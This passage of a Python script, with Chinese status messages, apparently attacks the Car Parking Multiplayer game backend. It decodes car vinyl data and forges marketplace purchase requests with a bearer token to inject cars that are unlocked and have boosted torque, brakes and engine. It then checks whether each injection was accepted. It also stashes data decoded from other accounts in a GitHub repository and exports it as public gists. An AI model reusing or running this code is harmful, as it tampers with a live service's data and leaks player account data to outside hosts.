                                    _pay19 = {'message': 'stash ' + _p19, 'content': base64.b64encode(_ustr19.encode('utf-8')).decode('ascii')}
                                    if _sha19:
                                        _pay19['sha'] = _sha19
                                    _gh_http(_url19, 'PUT', _pay19)
                                    _ok19 = '已推送 %s（%d 字节）' % (_p19, len(_ustr19))
                                except Exception as _ge19:
                                    _ok19 = '推送失败: %s' % repr(_ge19)[:120]
                            report.append('  GitHub: %s' % _ok19)
                            report.append('  dec_b64: vynils=%s window=%s' % ('有' if _stash19.get('vynils_dec_b64') else '无', '有' if _stash19.get('window_dec_b64') else '无'))
                    except Exception as _e19:
                        report.append('  [19] 外层 %s' % str(_e19)[:120])

                if _want('unstash'):
                    report.append('--- (20) 贴纸注入 Vynils Unstash ---')
                    try:
                        _uid8_20 = (_uidv or '')[:8].upper()
                        _lst20 = []
                        if GH_TOKEN and GH_REPO:
                            try:
                                _items20 = _gh_http('https://api.github.com/repos/%s/contents/' % GH_REPO, 'GET')
                                for _it20 in (_items20 if isinstance(_items20, list) else []):
                                    _nm20 = str(_it20.get('name') or '')
                                    if _nm20.startswith('stash_vyn_') and _nm20.endswith('.json'):
                                        _lst20.append(_nm20)
                            except Exception as _le20:
                                report.append('  列目录失败: %s' % repr(_le20)[:120])
                        report.append('  找到存档: %s' % (', '.join(_lst20) if _lst20 else '无'))
                        _use20 = None
                        for _nm20 in _lst20:
                            if _uid8_20 and (_uid8_20 in _nm20):
                                continue
                            try:
                                _url20 = 'https://api.github.com/repos/%s/contents/%s' % (GH_REPO, _nm20)
                                _obj20 = _gh_http(_url20, 'GET')
                                _cont20 = base64.b64decode(_obj20.get('content') or '').decode('utf-8', 'replace')
                                _st20 = json.loads(_cont20)
                            except Exception:
                                continue
                            if str(_st20.get('vynils_kind') or '') == 'plain' and _st20.get('vynils_raw') is not None:
                                _use20 = _st20
                                _use20['_name'] = _nm20
                                break
                        if not _use20:
                            report.append('  没有可用的明文存档（先在季伯常号上跑段10）')
                        else:
                            report.append('  使用存档: %s (uid8=%s)' % (_use20.get('_name'), _use20.get('uid8')))
                            _d20 = None
                            if _aes_body is not None:
                                _r20 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', _aes_body, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                                _d20 = _r20.get('result') if isinstance(_r20, dict) else None
                                for _u in range(2):
                                    if isinstance(_d20, str):
                                        try:
                                            _d20 = json.loads(_d20)
                                        except Exception:
                                            break
                            _dc20 = [x for x in _d20 if isinstance(x, dict) and x.get('texts') and int(x.get('CarID') or 0) > 0] if isinstance(_d20, list) else []
                            if not _dc20:
                                report.append('  无可用模板车')
                            else:
                                _car20 = _dc20[0]
                                _cid20 = int(_car20.get('CarID') or 0)
                                _inst20 = '%s_%d_TRX' % (_uid8_20, _cid20)
                                _new20 = json.loads(json.dumps(_car20, ensure_ascii=False))
                                if _use20.get('vynils_raw') is not None:
                                    _vy20 = json.loads(json.dumps(_use20.get('vynils_raw'), ensure_ascii=False))
                                    if isinstance(_vy20, dict) and ('CarID' in _vy20):
                                        _vy20['CarID'] = _cid20
                                    _new20['Vynils'] = _vy20
                                if _use20.get('window_raw') is not None:
                                    _wv20 = json.loads(json.dumps(_use20.get('window_raw'), ensure_ascii=False))
                                    _new20['WindowVinyls'] = _wv20
                                _new20['engineID'] = 5
                                _new20['cdi'] = True
                                _new20['isLocked'] = False
                                _new20['torque'] = 3000.0
                                _new20['brake'] = 3000.0
                                _new20['mass'] = 1100.0
                                _new20['texts'] = ['', '', _inst20]
                                _new20['dataVersion'] = 2
                                _sr20 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/WSGetCarListV3', {'data': 20}, headers={'Authorization': 'Bearer ' + _tv}, timeout=25)
                                _sv20 = _sr20.get('result') if isinstance(_sr20, dict) else None
                                for _u in range(2):
                                    if isinstance(_sv20, str):
                                        try:
                                            _sv20 = json.loads(_sv20)
                                        except Exception:
                                            break
                                _slot20 = None
                                if isinstance(_sv20, list):
                                    for _sl20 in _sv20:
                                        if isinstance(_sl20, dict) and int(_sl20.get('carID') or 0) == 0:
                                            _slot20 = _sl20
                                            break
                                    if _slot20 is None and _sv20:
                                        _slot20 = _sv20[0]
                                if not isinstance(_slot20, dict):
                                    report.append('  无可用车市槽位')
                                else:
                                    _pay20 = {
                                        'ownerID': _slot20.get('ownerID', ''),
                                        'ownerName': _slot20.get('ownerName', ''),
                                        'description': _slot20.get('description', ''),
                                        'CarID': _slot20.get('carID', 0),
                                        'carGeneratedID': _slot20.get('carGeneratedID', ''),
                                        'ownerAccountID': _slot20.get('ownerAccountID', ''),
                                        'oneCar': _new20,
                                        'vynilOneCar': _new20.get('Vynils', {}),
                                        'loadedLocalCar': {'instanceID': -400000},
                                        'price': _slot20.get('price', 100),
                                        'SellingCar': {},
                                        'willReject': False,
                                        'dislike': 1,
                                        'like': 0,
                                        'liked': False,
                                        'disliked': False,
                                        'mode': 1,
                                    }
                                    _pr20 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/WSPurchaseCarV3', {'data': json.dumps(_pay20, ensure_ascii=False)}, headers={'Authorization': 'Bearer ' + _tv}, timeout=40)
                                    _ps20 = json.dumps(_pr20, ensure_ascii=False)[:120] if isinstance(_pr20, dict) else str(_pr20)[:120]
                                    report.append('  注入响应: %s' % _ps20)
                                    time.sleep(1.2)
                                    _r20b = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                                    _v20b = _r20b.get('result') if isinstance(_r20b, dict) else None
                                    for _u in range(2):
                                        if isinstance(_v20b, str):
                                            try:
                                                _v20b = json.loads(_v20b)
                                            except Exception:
                                                break
                                    _f20 = None
                                    if isinstance(_v20b, list):
                                        for _c20 in _v20b:
                                            _t20 = _c20.get('texts') if isinstance(_c20, dict) else None
                                            if isinstance(_t20, list):
                                                for _tt20 in _t20:
                                                    if str(_tt20) == _inst20:
                                                        _f20 = _c20
                                                        break
                                            if _f20 is not None:
                                                break
                                    if _f20 is None:
                                        report.append('  回读: 未找到新车（注入被拒/过滤）')
                                    else:
                                        _fv20 = _f20.get('Vynils')
                                        _fk20 = 'none'
                                        if isinstance(_fv20, dict):
                                            _fk20 = 'plain(dict)'
                                        elif isinstance(_fv20, str):
                                            _fk20 = 'str(len=%d)' % len(_fv20)
                                        elif isinstance(_fv20, list):
                                            _fk20 = 'list(len=%d)' % len(_fv20)
                                        report.append('  回读: 新车已入库 CarID=%s' % str(_f20.get('CarID')))
                                        report.append('    Vynils -> %s' % _fk20)
                                        report.append('    Vynils 预览 -> %s' % json.dumps(_fv20, ensure_ascii=False)[:130])
                                        _fw20 = _f20.get('WindowVinyls')
                                        report.append('    WindowVinyls -> %s 预览 %s' % (type(_fw20).__name__, json.dumps(_fw20, ensure_ascii=False)[:90]))
                                        report.append('    vectors 预览 -> %s' % json.dumps(_f20.get('vectors'), ensure_ascii=False)[:90])
                    except Exception as _e20:
                        report.append('  [20] 外层 %s' % str(_e20)[:120])
                if _want('gexp'):
                    report.append('--- (21) 数据导出 Gist ---')
                    try:
                        _lst21 = []
                        if GH_TOKEN and GH_REPO:
                            try:
                                _items21 = _gh_http('https://api.github.com/repos/%s/contents/' % GH_REPO, 'GET')
                                for _it21 in (_items21 if isinstance(_items21, list) else []):
                                    _nm21 = str(_it21.get('name') or '')
                                    if _nm21.startswith('stash_vyn_') and _nm21.endswith('.json'):
                                        _lst21.append(_nm21)
                            except Exception as _le21:
                                report.append('  列目录失败: %s' % repr(_le21)[:120])
                        report.append('  待导出: %s' % (', '.join(_lst21) if _lst21 else '无（先跑段10）'))
                        for _nm21 in _lst21:
                            try:
                                _url21 = 'https://api.github.com/repos/%s/contents/%s' % (GH_REPO, _nm21)
                                _obj21 = _gh_http(_url21, 'GET')
                                _cont21 = base64.b64decode(_obj21.get('content') or '').decode('utf-8', 'replace')
                                _g_pay21 = {
                                    'description': 'cpm stash export ' + _nm21,
                                    'public': True,
                                    'files': {_nm21: {'content': _cont21}},
                                }
                                _g_req21 = urllib.request.Request('https://api.github.com/gists', method='POST', data=json.dumps(_g_pay21).encode('utf-8'))
                                for _hk21, _hv21 in _gh_headers().items():
                                    _g_req21.add_header(_hk21, _hv21)
                                _g_req21.add_header('Content-Type', 'application/json')
                                with urllib.request.urlopen(_g_req21, timeout=30) as _gr21:
                                    _g_obj21 = json.loads(_gr21.read().decode('utf-8', 'replace'))
                                _g_id21 = str(_g_obj21.get('id') or '')
                                _raw21 = ''
                                _fl21 = _g_obj21.get('files') or {}
                                if isinstance(_fl21, dict):
                                    for _fk21 in _fl21:
                                        _raw21 = str((_fl21.get(_fk21) or {}).get('raw_url') or '')
                                report.append('  [%s] 已导出 gist=%s' % (_nm21, _g_id21))
                                report.append('    raw: %s' % _raw21)
                            except Exception as _ge21:
                                report.append('  [%s] 导出失败: %s' % (_nm21, repr(_ge21)[:120]))
                    except Exception as _e21:
                        report.append('  [21] 外层 %s' % str(_e21)[:120])
                if _want('vyn'):
                    report.append('--- (22) Vynils 结构分析 ---')
                    try:
                        _d22 = None
                        if _aes_body is not None:
                            _r22 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', _aes_body, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                            _d22 = _r22.get('result') if isinstance(_r22, dict) else None
                            for _u in range(2):
                                if isinstance(_d22, str):
                                    try:
                                        _d22 = json.loads(_d22)
                                    except Exception:
                                        break
                        _dc22 = [x for x in _d22 if isinstance(x, dict) and x.get('texts') and int(x.get('CarID') or 0) > 0] if isinstance(_d22, list) else []
                        if not _dc22:
                            report.append('  无可用车')
                        else:
                            _car22 = _dc22[0]
                            _vy22 = _car22.get('Vynils')
                            _b22 = None
                            if isinstance(_vy22, str) and len(_vy22) > 8:
                                _b22 = _vy22.strip()
                            elif isinstance(_vy22, list) and _vy22 and all(isinstance(_x, str) and len(_x) <= 2 for _x in _vy22[:80]):
                                _b22 = ''.join(_vy22)
                            _out22 = None
                            if _b22:
                                _raw22 = base64.b64decode(_b22 + '=' * ((4 - len(_b22) % 4) % 4))
                                _out22 = brotli_decompress(_raw22)
                                if not _out22:
                                    _out22 = brotli_decompress(xor_bytes(_raw22, derive_key(c.uid or '')))
                            if not _out22:
                                report.append('  Vynils 解码失败（type=%s）' % type(_vy22).__name__)
                            else:
                                _L22 = len(_out22)
                                report.append('  车key=%s | Vynils 解码=%dB' % (str((_car22.get('texts') or ['', '', ''])[2])[:40], _L22))
                                report.append('  --- hex dump (0..384) ---')
                                for _i22 in range(0, min(384, _L22), 16):
                                    _c22 = _out22[_i22:_i22 + 16]
                                    report.append('  %04x  %s' % (_i22, ' '.join('%02x' % _bb for _bb in _c22)))
                                def _clean22(_v):
                                    return _v == 0 or (1e-6 < abs(_v) < 1e5)
                                _runs22 = []
                                _st22 = None
                                _run22 = 0
                                _j22 = 6
                                while _j22 + 4 <= _L22:
                                    _v22 = struct.unpack('<f', _out22[_j22:_j22 + 4])[0]
                                    if _clean22(_v22):
                                        if _st22 is None:
                                            _st22 = _j22
                                        _run22 += 1
                                    else:
                                        if _run22 >= 9:
                                            _runs22.append((_st22, _run22))
                                        _st22 = None
                                        _run22 = 0
                                    _j22 += 4
                                if _run22 >= 9:
                                    _runs22.append((_st22, _run22))
                                report.append('  --- 干净float段(>=9连): %d 段 ---' % len(_runs22))
                                _mods22 = {}
                                for _s22, _r22n in _runs22[:400]:
                                    _m22 = (_s22 - 6) % 56
                                    _mods22[_m22] = _mods22.get(_m22, 0) + 1
                                report.append('  起点mod56分布: %s' % str(sorted(_mods22.items())))
                                for _s22, _r22n in _runs22[:10]:
                                    report.append('  seg @%d len=%d mod56=%d' % (_s22, _r22n, (_s22 - 6) % 56))
                    except Exception as _e22:
                        report.append('  [22] 外层 %s' % str(_e22)[:150])
                if _want('vyn2'):
                    report.append('--- (23) 贴纸整包转码注入（v1）---')
                    try:
                        _d23 = None
                        if _aes_body is not None:
                            _r23 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', _aes_body, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                            _d23 = _r23.get('result') if isinstance(_r23, dict) else None
                            for _u in range(2):
                                if isinstance(_d23, str):
                                    try:
                                        _d23 = json.loads(_d23)
                                    except Exception:
                                        break
                        _dc23 = [x for x in _d23 if isinstance(x, dict) and x.get('texts') and int(x.get('CarID') or 0) > 0] if isinstance(_d23, list) else []
                        if not _dc23:
                            report.append('  无可用车')
                        else:
                            _car23 = _dc23[0]
                            _vy23 = _car23.get('Vynils')
                            _b23 = None
                            if isinstance(_vy23, str) and len(_vy23) > 8:
                                _b23 = _vy23.strip()
                            elif isinstance(_vy23, list) and _vy23 and all(isinstance(_x, str) and len(_x) <= 2 for _x in _vy23[:80]):
                                _b23 = ''.join(_vy23)
                            _out23 = None
                            if _b23:
                                _raw23 = base64.b64decode(_b23 + '=' * ((4 - len(_b23) % 4) % 4))
                                _out23 = brotli_decompress(_raw23)
                                if not _out23:
                                    _out23 = brotli_decompress(xor_bytes(_raw23, derive_key(c.uid or '')))
                            if not _out23:
                                report.append('  Vynils 解码失败')
                            else:
                                _D23 = _out23
                                _N23 = 438
                                _starts23 = []
                                _prev23 = 6
                                for _i23 in range(_N23):
                                    _lo23 = max(0, _prev23 + 8)
                                    _hi23 = min(len(_D23) - 12, _prev23 + 120)
                                    _cand23 = []
                                    for _o23 in range(_lo23, _hi23):
                                        _x23, _y23, _z23 = struct.unpack('<fff', _D23[_o23:_o23 + 12])
                                        if abs(_z23 - _i23) < 1.5 and abs(_x23) < 1.2 and abs(_y23) < 1.2:
                                            _cand23.append(_o23)
                                    if _cand23:
                                        _o23 = min(_cand23, key=lambda _c: abs(_c - _prev23))
                                        _starts23.append(_o23)
                                        _prev23 = _o23
                                    else:
                                        _starts23.append(None)
                                        _prev23 = _prev23 + 53
                                _found23 = sum(1 for _s in _starts23 if _s is not None)
                                report.append('  锚定 %d/%d 个元素' % (_found23, _N23))
                                _elems23 = []
                                for _i23 in range(_N23):
                                    _s23 = _starts23[_i23]
                                    _e23 = _starts23[_i23 + 1] if _i23 + 1 < _N23 and _starts23[_i23 + 1] else (_s23 + 53 if _s23 else None)
                                    if _s23 is None or _e23 is None:
                                        continue
                                    _px23, _py23, _pz23 = struct.unpack('<fff', _D23[_s23:_s23 + 12])
                                    _rx23, _ry23, _rz23 = struct.unpack('<fff', _D23[_s23 + 12:_s23 + 24])
                                    _ix23, _iy23, _iz23 = struct.unpack('<fff', _D23[_s23 + 24:_s23 + 36])
                                    _tb23 = _D23[_s23 + 36:_e23]
                                    _A23 = struct.unpack('<i', _tb23[:4])[0] if len(_tb23) >= 4 else 0
                                    _tl23 = struct.unpack('<i', _tb23[4:8])[0] if len(_tb23) >= 8 else 0
                                    _tx23 = ''
                                    _cpos23 = 8
                                    if 0 < _tl23 < 64 and len(_tb23) >= 8 + _tl23:
                                        try:
                                            _tx23 = _tb23[8:8 + _tl23].decode('utf-8', 'replace')
                                            _cpos23 = 8 + _tl23
                                        except Exception:
                                            _tx23 = ''
                                    _col23 = struct.unpack('<I', _tb23[_cpos23:_cpos23 + 4])[0] if len(_tb23) >= _cpos23 + 4 else 0
                                    _pk23 = struct.unpack('<I', _tb23[_cpos23 + 4:_cpos23 + 8])[0] if len(_tb23) >= _cpos23 + 8 else 0
                                    _elems23.append({
                                        'position': {'x': round(_px23, 6), 'y': round(_py23, 6), 'z': round(_pz23, 6)},
                                        'scaleRotation': {'x': round(_rx23, 6), 'y': round(_ry23, 6), 'z': round(_rz23, 6)},
                                        'iconPosition': {'x': round(_ix23, 6), 'y': round(_iy23, 6), 'z': round(_iz23, 6)},
                                        'text': _tx23,
                                        'color': int(_col23),
                                        'packedData': int(_pk23),
                                    })
                                report.append('  解析出 %d 个元素' % len(_elems23))
                                for _k23 in range(min(3, len(_elems23))):
                                    report.append('   E%d -> %s' % (_k23, json.dumps(_elems23[_k23], ensure_ascii=False)[:160]))
                                _new23 = json.loads(json.dumps(_car23, ensure_ascii=False))
                                _new23['Vynils'] = {'allVynils': _elems23, 'CarID': int(_car23.get('CarID') or 0)}
                                _new23['engineID'] = 5
                                _new23['cdi'] = True
                                _new23['isLocked'] = False
                                _new23['torque'] = 3000.0
                                _new23['brake'] = 3000.0
                                _new23['mass'] = 1100.0
                                _inst23 = '%s_%d_TRF' % (((_uidv or '')[:8].upper()), int(_car23.get('CarID') or 0))
                                _new23['texts'] = ['', '', _inst23]
                                _new23['dataVersion'] = 2
                                _sr23 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/WSGetCarListV3', {'data': 20}, headers={'Authorization': 'Bearer ' + _tv}, timeout=25)
                                _sv23 = _sr23.get('result') if isinstance(_sr23, dict) else None
                                for _u in range(2):
                                    if isinstance(_sv23, str):
                                        try:
                                            _sv23 = json.loads(_sv23)
                                        except Exception:
                                            break
                                _slot23 = None
                                if isinstance(_sv23, list):
                                    for _sl23 in _sv23:
                                        if isinstance(_sl23, dict) and int(_sl23.get('carID') or 0) == 0:
                                            _slot23 = _sl23
                                            break
                                    if _slot23 is None and _sv23:
                                        _slot23 = _sv23[0]
                                if not isinstance(_slot23, dict):
                                    report.append('  无可用车市槽位')
                                else:
                                    _pay23 = {
                                        'ownerID': _slot23.get('ownerID', ''),
                                        'ownerName': _slot23.get('ownerName', ''),
                                        'description': _slot23.get('description', ''),
                                        'CarID': _slot23.get('carID', 0),
                                        'carGeneratedID': _slot23.get('carGeneratedID', ''),
                                        'ownerAccountID': _slot23.get('ownerAccountID', ''),
                                        'oneCar': _new23,
                                        'vynilOneCar': _new23.get('Vynils', {}),
                                        'loadedLocalCar': {'instanceID': -500000},
                                        'price': _slot23.get('price', 100),
                                        'SellingCar': {},
                                        'willReject': False,
                                        'dislike': 1,
                                        'like': 0,
                                        'liked': False,
                                        'disliked': False,
                                        'mode': 1,
                                    }
                                    _pr23 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/WSPurchaseCarV3', {'data': json.dumps(_pay23, ensure_ascii=False)}, headers={'Authorization': 'Bearer ' + _tv}, timeout=40)
                                    _ps23 = json.dumps(_pr23, ensure_ascii=False)[:120] if isinstance(_pr23, dict) else str(_pr23)[:120]
                                    report.append('  注入响应: %s' % _ps23)
                                    time.sleep(1.2)
                                    _r23b = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                                    _v23b = _r23b.get('result') if isinstance(_r23b, dict) else None
                                    for _u in range(2):
                                        if isinstance(_v23b, str):
                                            try:
                                                _v23b = json.loads(_v23b)
                                            except Exception:
                                                break
                                    _f23 = None
                                    if isinstance(_v23b, list):
                                        for _c23 in _v23b:
                                            _t23 = _c23.get('texts') if isinstance(_c23, dict) else None
                                            if isinstance(_t23, list):
                                                for _tt23 in _t23:
                                                    if str(_tt23) == _inst23:
                                                        _f23 = _c23
                                                        break
                                            if _f23 is not None:
                                                break
                                    if _f23 is None:
                                        report.append('  回读: 未找到新车')
                                    else:
                                        _fv23 = _f23.get('Vynils')
                                        _fk23 = type(_fv23).__name__
                                        _n23 = 0
                                        try:
                                            _n23 = len((_fv23 or {}).get('allVynils') or [])
                                        except Exception:
                                            _n23 = 0
                                        report.append('  回读: 新车已入库 CarID=%s | Vynils type=%s 元素=%d' % (str(_f23.get('CarID')), _fk23, _n23))
                                        try:
                                            _ff23 = json.dumps(_fv23, ensure_ascii=False)[:200]
                                        except Exception:
                                            _ff23 = '?'
                                        report.append('  回读预览: %s' % _ff23)
                    except Exception as _e23:
                        report.append('  [23] 外层 %s' % str(_e23)[:150])
                if _want('vyn3'):
                    report.append('--- (24) 贴纸过滤版转码注入（v2）---')
                    try:
                        _d24 = None
                        if _aes_body is not None:
                            _r24 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', _aes_body, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                            _d24 = _r24.get('result') if isinstance(_r24, dict) else None
                            for _u in range(2):
                                if isinstance(_d24, str):
                                    try:
                                        _d24 = json.loads(_d24)
                                    except Exception:
                                        break
                        _dc24 = [x for x in _d24 if isinstance(x, dict) and x.get('texts') and int(x.get('CarID') or 0) > 0] if isinstance(_d24, list) else []
                        if not _dc24:
                            report.append('  无可用车')
                        else:
                            _car24 = _dc24[0]
                            _vy24 = _car24.get('Vynils')
                            _b24 = None
                            if isinstance(_vy24, str) and len(_vy24) > 8:
                                _b24 = _vy24.strip()
                            elif isinstance(_vy24, list) and _vy24 and all(isinstance(_x, str) and len(_x) <= 2 for _x in _vy24[:80]):
                                _b24 = ''.join(_vy24)
                            _out24 = None
                            if _b24:
                                _raw24 = base64.b64decode(_b24 + '=' * ((4 - len(_b24) % 4) % 4))
                                _out24 = brotli_decompress(_raw24)
                                if not _out24:
                                    _out24 = brotli_decompress(xor_bytes(_raw24, derive_key(c.uid or '')))
                            if not _out24:
                                report.append('  Vynils 解码失败')
                            else:
                                _D24 = _out24
                                _N24 = 438
                                _starts24 = []
                                _prev24 = 6
                                for _i24 in range(_N24):
                                    _lo24 = max(0, _prev24 + 8)
                                    _hi24 = min(len(_D24) - 12, _prev24 + 120)
                                    _cand24 = []
                                    for _o24 in range(_lo24, _hi24):
                                        _x24, _y24, _z24 = struct.unpack('<fff', _D24[_o24:_o24 + 12])
                                        if abs(_z24 - _i24) < 1.5 and abs(_x24) < 1.2 and abs(_y24) < 1.2:
                                            _cand24.append(_o24)
                                    if _cand24:
                                        _o24 = min(_cand24, key=lambda _c: abs(_c - _prev24))
                                        _starts24.append(_o24)
                                        _prev24 = _o24
                                    else:
                                        _starts24.append(None)
                                        _prev24 = _prev24 + 53
                                _elems24 = []
                                _drop24 = 0
                                for _i24 in range(_N24):
                                    _s24 = _starts24[_i24]
                                    _e24 = _starts24[_i24 + 1] if _i24 + 1 < _N24 and _starts24[_i24 + 1] else (_s24 + 53 if _s24 else None)
                                    if _s24 is None or _e24 is None:
                                        _drop24 += 1
                                        continue
                                    _px24, _py24, _pz24 = struct.unpack('<fff', _D24[_s24:_s24 + 12])
                                    _rx24, _ry24, _rz24 = struct.unpack('<fff', _D24[_s24 + 12:_s24 + 24])
                                    _ix24, _iy24, _iz24 = struct.unpack('<fff', _D24[_s24 + 24:_s24 + 36])
                                    _tb24 = _D24[_s24 + 36:_e24]
                                    _tl24 = struct.unpack('<i', _tb24[4:8])[0] if len(_tb24) >= 8 else 0
                                    _tx24 = ''
                                    _cpos24 = 8
                                    if 0 < _tl24 < 64 and len(_tb24) >= 8 + _tl24:
                                        try:
                                            _tx24 = _tb24[8:8 + _tl24].decode('utf-8', 'replace')
                                            _cpos24 = 8 + _tl24
                                        except Exception:
                                            _tx24 = ''
                                    _col24 = struct.unpack('<I', _tb24[_cpos24:_cpos24 + 4])[0] if len(_tb24) >= _cpos24 + 4 else 0
                                    _pk24 = struct.unpack('<I', _tb24[_cpos24 + 4:_cpos24 + 8])[0] if len(_tb24) >= _cpos24 + 8 else 0
                                    _ok24 = True
                                    for _v24 in (_px24, _py24, _pz24, _rx24, _ry24, _rz24, _ix24, _iy24, _iz24):
                                        if _v24 != _v24 or abs(_v24) > 1e6:
                                            _ok24 = False
                                            break
                                    if _ok24 and (abs(_px24) > 1.5 or abs(_py24) > 1.5 or not (-1 <= _pz24 <= 439)):
                                        _ok24 = False
                                    if _ok24 and (abs(_rx24) > 400 or abs(_ry24) > 400 or abs(_rz24) > 400):
                                        _ok24 = False
                                    if _ok24 and (abs(_ix24) > 5 or abs(_iy24) > 5 or abs(_iz24) > 5):
                                        _ok24 = False
                                    if _ok24 and ('\ufffd' in _tx24):
                                        _ok24 = False
                                    if not _ok24:
                                        _drop24 += 1
                                        continue
                                    _elems24.append({
                                        'position': {'x': round(_px24, 6), 'y': round(_py24, 6), 'z': 0.0},
                                        'scaleRotation': {'x': round(_rx24, 6), 'y': round(_ry24, 6), 'z': round(_rz24, 6)},
                                        'iconPosition': {'x': round(_ix24, 6), 'y': round(_iy24, 6), 'z': round(_iz24, 6)},
                                        'text': _tx24,
                                        'color': (int(_col24) | 0xFF000000) if 0 <= int(_col24) <= 0xFFFFFFFF else 0xFF000000,
                                        'packedData': int(_pk24) if -2147483648 <= int(_pk24) <= 2147483647 else 0,
                                    })
                                for _q24 in range(len(_elems24)):
                                    _elems24[_q24]['position']['z'] = float(_q24)
                                report.append('  解析保留 %d / 丢弃 %d' % (len(_elems24), _drop24))
                                for _k24 in range(min(3, len(_elems24))):
                                    report.append('   E%d -> %s' % (_k24, json.dumps(_elems24[_k24], ensure_ascii=False)[:160]))
                                if len(_elems24) < 10:
                                    report.append('  有效元素太少，放弃')
                                else:
                                    _new24 = json.loads(json.dumps(_car24, ensure_ascii=False))
                                    _new24['Vynils'] = {'allVynils': _elems24, 'CarID': int(_car24.get('CarID') or 0)}
                                    _new24['engineID'] = 5
                                    _new24['cdi'] = True
                                    _new24['isLocked'] = False
                                    _new24['torque'] = 3000.0
                                    _new24['brake'] = 3000.0
                                    _new24['mass'] = 1100.0
                                    _inst24 = '%s_%d_TRG' % (((_uidv or '')[:8].upper()), int(_car24.get('CarID') or 0))
                                    _new24['texts'] = ['', '', _inst24]
                                    _new24['dataVersion'] = 2
                                    _sr24 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/WSGetCarListV3', {'data': 20}, headers={'Authorization': 'Bearer ' + _tv}, timeout=25)
                                    _sv24 = _sr24.get('result') if isinstance(_sr24, dict) else None
                                    for _u in range(2):
                                        if isinstance(_sv24, str):
                                            try:
                                                _sv24 = json.loads(_sv24)
                                            except Exception:
                                                break
                                    _slot24 = None
                                    if isinstance(_sv24, list):
                                        for _sl24 in _sv24:
                                            if isinstance(_sl24, dict) and int(_sl24.get('carID') or 0) == 0:
                                                _slot24 = _sl24
                                                break
                                        if _slot24 is None and _sv24:
                                            _slot24 = _sv24[0]
                                    if not isinstance(_slot24, dict):
                                        report.append('  无可用车市槽位')
                                    else:
                                        _pay24 = {
                                            'ownerID': _slot24.get('ownerID', ''),
                                            'ownerName': _slot24.get('ownerName', ''),
                                            'description': _slot24.get('description', ''),
                                            'CarID': _slot24.get('carID', 0),
                                            'carGeneratedID': _slot24.get('carGeneratedID', ''),
                                            'ownerAccountID': _slot24.get('ownerAccountID', ''),
                                            'oneCar': _new24,
                                            'vynilOneCar': _new24.get('Vynils', {}),
                                            'loadedLocalCar': {'instanceID': -600000},
                                            'price': _slot24.get('price', 100),
                                            'SellingCar': {},
                                            'willReject': False,
                                            'dislike': 1,
                                            'like': 0,
                                            'liked': False,
                                            'disliked': False,
                                            'mode': 1,
                                        }
                                        _pr24 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/WSPurchaseCarV3', {'data': json.dumps(_pay24, ensure_ascii=False)}, headers={'Authorization': 'Bearer ' + _tv}, timeout=40)
                                        _ps24 = json.dumps(_pr24, ensure_ascii=False)[:120] if isinstance(_pr24, dict) else str(_pr24)[:120]
                                        report.append('  注入响应: %s' % _ps24)
                                        time.sleep(1.2)
                                        _r24b = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                                        _v24b = _r24b.get('result') if isinstance(_r24b, dict) else None
                                        for _u in range(2):
                                            if isinstance(_v24b, str):
                                                try:
                                                    _v24b = json.loads(_v24b)
                                                except Exception:
                                                    break
                                        _f24 = None
                                        if isinstance(_v24b, list):
                                            for _c24 in _v24b:
                                                _t24 = _c24.get('texts') if isinstance(_c24, dict) else None
                                                if isinstance(_t24, list):
                                                    for _tt24 in _t24:
                                                        if str(_tt24) == _inst24:
                                                            _f24 = _c24
                                                            break
                                                if _f24 is not None:
                                                    break
                                        if _f24 is None:
                                            report.append('  回读: 未找到新车')
                                        else:
                                            _fv24 = _f24.get('Vynils')
                                            _n24 = 0
                                            try:
                                                _n24 = len((_fv24 or {}).get('allVynils') or [])
                                            except Exception:
                                                _n24 = 0
                                            report.append('  回读: 新车已入库 CarID=%s | 元素=%d' % (str(_f24.get('CarID')), _n24))
                                            try:
                                                _ff24 = json.dumps(_fv24, ensure_ascii=False)[:220]
                                            except Exception:
                                                _ff24 = '?'
                                            report.append('  回读预览: %s' % _ff24)
                    except Exception as _e24:
                        report.append('  [24] 外层 %s' % str(_e24)[:150])
                if _want('carb'):
                    report.append('--- (25) 车辆清单与嫌疑标记 ---')
                    try:
                        _d25 = None
                        if _aes_body is not None:
                            _r25 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', _aes_body, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                            _d25 = _r25.get('result') if isinstance(_r25, dict) else None
                            for _u in range(2):
                                if isinstance(_d25, str):
                                    try:
                                        _d25 = json.loads(_d25)
                                    except Exception:
                                        break
                        _dc25 = _d25 if isinstance(_d25, list) else []
                        report.append('  车对象总数: %d' % len(_dc25))
                        _susp25 = []
                        for _c25 in _dc25:
                            if not isinstance(_c25, dict):
                                continue
                            _t25 = _c25.get('texts') or []
                            _k25 = ''
                            if isinstance(_t25, list) and len(_t25) >= 3:
                                _k25 = str(_t25[2] or '')
                            _cid25 = str(_c25.get('CarID'))
                            _sz25 = len(json.dumps(_c25, ensure_ascii=False))
                            _flag25 = ''
                            for _m25 in ('TST', 'TR9', 'TRX', 'TRF', 'TRG'):
                                if _m25 in _k25:
                                    _flag25 = '<<< ' + _m25
                                    _susp25.append((_k25, _cid25, _sz25))
                                    break
                            if _k25:
                                report.append('  [%s] CarID=%s size=%d %s' % (_k25[:42], _cid25, _sz25, _flag25))
